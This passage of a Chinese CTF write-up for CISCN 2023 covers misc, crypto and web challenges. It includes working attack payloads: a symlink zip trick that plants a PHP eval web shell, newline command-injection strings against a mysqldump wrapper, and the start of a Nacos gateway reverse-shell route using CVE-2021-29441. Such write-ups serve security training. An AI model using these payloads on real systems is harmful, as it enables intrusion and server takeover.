class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> ind!=<span class="hljs-number">0</span>:<br>            data[sind].append(ind//<span class="hljs-number">53</span>)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">while</span> i&lt;w:<br>    ima=a[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    imk=k[<span class="hljs-number">0</span>:<span class="hljs-number">73</span>,i:i+<span class="hljs-number">53</span>]<br>    Status=[<span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> d:<br>        im2=cv2.imread(os.path.join(path,j))<br>        check(ima,im2,<span class="hljs-number">0</span>)<br>        check(imk,im2,<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> Status==[<span class="hljs-literal">True</span>,<span class="hljs-literal">True</span>]:<br>            <span class="hljs-keyword">break</span><br>    i+=<span class="hljs-number">53</span><br><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">42</span>,<span class="hljs-number">42</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w//<span class="hljs-number">53</span>):<br>    a.putpixel((data[<span class="hljs-number">1</span>][i],data[<span class="hljs-number">0</span>][i]),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&#x27;123.png&#x27;</span>)<br>a.show()<br></code></pre></td></tr></table></figure>

<h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2><p>python 沙盒</p>
<p>利用<code>_</code>拼接字符串后<code>eval</code>执行，同时限制了7位字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">Welcome to this python shell,<span class="hljs-keyword">try</span> to find the flag!<br>&gt;&gt;<span class="hljs-string">&#x27;open&#x27;</span><br><span class="hljs-string">&#x27;open&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;(&quot;/&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;fl&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/fl&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;ag&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;&quot;)&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;)&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;.&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;rea&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).rea&#x27;</span><br><br>&gt;&gt;_+<span class="hljs-string">&#x27;d()&#x27;</span><br><span class="hljs-string">&#x27;open(&quot;/flag&quot;).read()&#x27;</span><br><br>&gt;&gt;<span class="hljs-built_in">eval</span>(_)<br><span class="hljs-string">&#x27;flag&#123;b8c3ead1-cdad-4ddb-bb81-9486888d426a&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>打开后有很多宽度不一样的小<code>bmp</code>文件，放进010里分析发现在冗余位多了一些数据</p>
<p>以<code>bfReserved1</code>表示图片左上角<code>x</code>坐标，<code>bfReserved2</code>表示图片左上角<code>y</code>坐标，<code>biXPelsPerMeter</code>表示图片右下角<code>x</code>坐标，<code>biYPelsPerMeter</code>表示图片右下角<code>y</code>坐标画图</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-1.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-2.png"></p>
<p>画的时候注意<code>biHeight</code>，在<code>bmp</code>中该值是正数说明图像是倒向的即图像存储是由下到上；该值是负数说明图像是倒向的即图像存储是由上到下，所以遇到负数的图片需要反转一下在拼图</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">7200</span>,<span class="hljs-number">4000</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>)<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">38</span>:<span class="hljs-number">42</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">42</span>:<span class="hljs-number">46</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    If_rev = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">if</span>(If_rev != <span class="hljs-number">100</span>):<br>        pic = pic.transpose(Image.FLIP_TOP_BOTTOM)<br>    img.paste(pic,(Res1,Res2,Xpel,Ypel))<br>img.save(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>拼完后的图跑<code>zsteg</code>，得到第一部分的flag：<code>flag&#123;f1R5T_part_1s_LSB_sTeG0_</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-3.png"></p>
<p>然后还是<code>biHeight</code>，高度-100的做0，100的做1，binary之后得到第二部分flag：<code>2nd_paRT_15_reVeRSe_bMp_</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Res1_L,Res2_L,Ypel_L,XY_L = [],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res1_L.append(Res1)<br>    Res2_L.append(Res2)<br>    Ypel_L.append(Ypel)<br>    XY_L.append((Res2,Res1))<br>a = <span class="hljs-built_in">sorted</span>(Res1_L)<br>b = <span class="hljs-built_in">sorted</span>(Res2_L)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Ypel_L[ind] == <span class="hljs-number">4294967196</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;0&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;1&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-4.png"></p>
<p>第三部分在补齐字节的数据中<br>找到第一张图片<code>17447199634.bmp</code>，查看补齐字节的数据</p>
<p>发现依次是<code>FF D8</code>，<code>FF E1</code>等</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-misc-puzzle-5.png"></p>
<p>所以可以以<code>padding</code>数据按照左上到右下的顺序拼接得到<code>jpg</code>图片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>file_list = os.listdir(<span class="hljs-string">&#x27;tmp4&#x27;</span>)<br>Xpel_L,XY_L,Leng_L,Ypel_L,f_list = [],[],[],[],[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[i]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    Res1 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Res2 = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>],<span class="hljs-string">&#x27;little&#x27;</span>)<br>    Ypel = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">22</span>:<span class="hljs-number">26</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    Xpel_L.append(Xpel)<br>    XY_L.append((Res2,Res1))<br>    Leng_L.append((<span class="hljs-built_in">len</span>(f)-<span class="hljs-number">54</span>))<br>    Ypel_L.append(Ypel)<br>c = <span class="hljs-built_in">sorted</span>(XY_L)<br><br>Padding_file = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    ind = XY_L.index(c[i])<br>    <span class="hljs-keyword">if</span>(Leng_L[ind] != Xpel_L[ind]*<span class="hljs-number">300</span>):<br>        Padding_file.append(ind)<br><br>data = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Padding_file)):<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;./tmp4/<span class="hljs-subst">&#123;file_list[Padding_file[i]]&#125;</span>&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    w = <span class="hljs-built_in">int</span>.from_bytes(f[<span class="hljs-number">18</span>:<span class="hljs-number">22</span>], <span class="hljs-string">&#x27;little&#x27;</span>)<br>    f = f[<span class="hljs-number">54</span>:]<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">100</span>):<br>        pad = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(<span class="hljs-built_in">len</span>(f)-w*<span class="hljs-number">100</span>*<span class="hljs-number">3</span> == <span class="hljs-number">200</span>):<br>        pad = <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        pad = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        d = f[j*(w*<span class="hljs-number">3</span>+pad):j*(w*<span class="hljs-number">3</span>+pad)+w*<span class="hljs-number">3</span>+pad]<br>        data += d[-pad:]<br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br></code></pre></td></tr></table></figure>

<p>得到第三部分的flag：<code>3rd_parT_1s_paddINGINGING</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/flag.jpg"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" title="基于国密SM2算法的密钥密文分发"></a>基于国密SM2算法的密钥密文分发</h2><p>根据文档一步一步来即可，虽然有点没看懂</p>
<p>先找个网址生成一组公钥和密钥 <a href="https://www.lzltool.com/SM2">https://www.lzltool.com/SM2</a></p>
<p>登录拿id</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-1.png"></p>
<p>上传公钥</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-2.png"></p>
<p>访问<code>/api/quantum</code>获取密钥密文</p>
<p>访问<code>/api/check</code>发送<code>quantumString</code>的值</p>
<p>使<code>quantumStringUser</code>的值等于<code>quantumStringServer</code>的值即可通过验证</p>
<p>访问<code>/api/search</code>得到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86SM2%E7%AE%97%E6%B3%95%E7%9A%84%E5%AF%86%E9%92%A5%E5%AF%86%E6%96%87%E5%88%86%E5%8F%91-3.png"></p>
<h2 id="可信度量"><a href="#可信度量" class="headerlink" title="可信度量"></a>可信度量</h2><p>非预期</p>
<p><code>/proc/22/task/22/environ</code>可以直接看到flag</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-%E5%8F%AF%E4%BF%A1%E5%BA%A6%E9%87%8F.png"></p>
<h2 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd"></a>Sign_in_passwd</h2><p>base64换表</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-crypto-Sign_in_passwd.png"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>上传后返回源码</p>
<p>只能上传<code>zip</code>文件，上传后在<code>tmp</code>目录使用<code>unzip -o</code>解压</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//构造一个指向/var/www/html的软连接<br><span class="hljs-built_in">ln</span> -s /var/www/html poc<br><br>//保留软连接压缩<br>zip --symlinks test.zip poc<br><br>//创建跟第一个压缩包中目录同名的目录<br><span class="hljs-built_in">mkdir</span> poc<br><br>//接着向目录中写一个shell<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br><br>//压缩这个目录<br>zip -r test1.zip poc<br></code></pre></td></tr></table></figure>

<p>上传第一个压缩包后会在<code>tmp</code>目录下生成一个软连接到<code>/var/www/html</code>，当我们上传第二个压缩包时，因为<code>poc</code>目录已经软连接到<code>/var/www/html</code>了，所以解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/wj18.png"></p>
<h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>根据题目描述可知分别有查询和导出的功能点</p>
<p>根据执行命令后的返回值推测执行的命令如下</p>
<p>传入<code>?db=a&amp;table_2_query=b</code>时会执行<code>select * from a.b</code><br>传入<code>?db=a&amp;table_2_dump=b</code>时会执行<code>mysqldump -u root a b &gt; log/xxx.log</code></p>
<p>这里因为<code>a</code>和<code>b</code>的值可控，所以相当于我们可以执行命令了</p>
<p>方法1：<br>直接传<code>?db=ctf&amp;table_2_dump=%0a+id+&gt;+log/1+%0</code>，然后访问<code>log/1</code></p>
<p>方法2：<br>因为<code>mysqldump</code>在找不到我们给出的表的情况下会抛出错误信息<code>mysqldump: Couldn&#39;t find table: &quot;表名&quot;</code></p>
<p>在<code>linux</code>中可以利用<code>2&gt;</code>将命令执行的结果输出到文件中</p>
<p>传<code>/?db=ctf&amp;table_2_dump=\&lt;\?\=phpinfo\(\)?\&gt;+2&gt;+log/1.php</code>，然后访问<code>1.php</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-dumpit-2.png"></p>
<p>index.php源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;www-data&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-variable">$black</span> = <span class="hljs-string">&#x27;;`*#^$&amp;|&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$black</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    	<span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-variable">$black</span>[<span class="hljs-variable">$i</span>])===<span class="hljs-literal">FALSE</span>))&#123;<br>	    <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>	&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;host&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-string">&#x27;-h&#x27;</span>)===<span class="hljs-literal">FALSE</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=ctf&quot;</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1&#x27;</span>;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$db</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;db&#x27;</span>];<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no db!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2q</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_query&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from <span class="hljs-subst">$db</span>.<span class="hljs-subst">$t2q</span>&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2q</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br>    <span class="hljs-keyword">try</span>&#123;<br>    	<span class="hljs-variable">$stm</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    	<span class="hljs-variable">$res</span> = <span class="hljs-variable">$stm</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$res</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(PDOException <span class="hljs-variable">$e</span>)&#123;<br>    	<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$t2d</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;table_2_dump&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$t2d</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$db</span>)))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nop&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$randstr</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>());<br>    <span class="hljs-variable">$dump</span>=<span class="hljs-string">&#x27;mariadb-dump &#x27;</span>.<span class="hljs-variable">$db</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$t2d</span>.<span class="hljs-string">&#x27; &gt;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$dump</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;dump log here: &lt;a href=\&#x27;&#x27;</span>.<span class="hljs-string">&#x27;./log/&#x27;</span>.<span class="hljs-variable">$randstr</span>.<span class="hljs-string">&#x27;.log&#x27;</span>.<span class="hljs-string">&#x27;\&#x27;&gt;here&lt;/a&gt;&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>nacos服务，CVE-2021-29441添加任意用户进后台</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-1.png"></p>
<p>分析<code>backend-1.0-SNAPSHOT.jar</code></p>
<p>发现内部配置服务有个8888的gateway服务，id为backcfg</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">cloud:</span><br>    <span class="hljs-attr">nacos:</span><br>      <span class="hljs-attr">discovery:</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">backcfg</span><br>        <span class="hljs-attr">file-extension:</span> <span class="hljs-string">json</span><br>        <span class="hljs-attr">group:</span> <span class="hljs-string">DEFAULT_GROUP</span><br>        <span class="hljs-attr">server-addr:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">:8888</span><br></code></pre></td></tr></table></figure>

<p>可以通过修改Gateway配置文件反代backendservice服务实现rce</p>
<p>参考文章：<a href="https://xz.aliyun.com/t/11493#toc">https://xz.aliyun.com/t/11493#toc</a></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-web-BackendService-2.png"></p>
<p>反弹shell</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;spring&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;cloud&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;gateway&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;routes&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;exam&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;order&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;uri&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;lb://backendservice&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;predicates:&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><br>                            <span class="hljs-string">&quot;Path=/evil/**&quot;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;filters&quot;</span><span 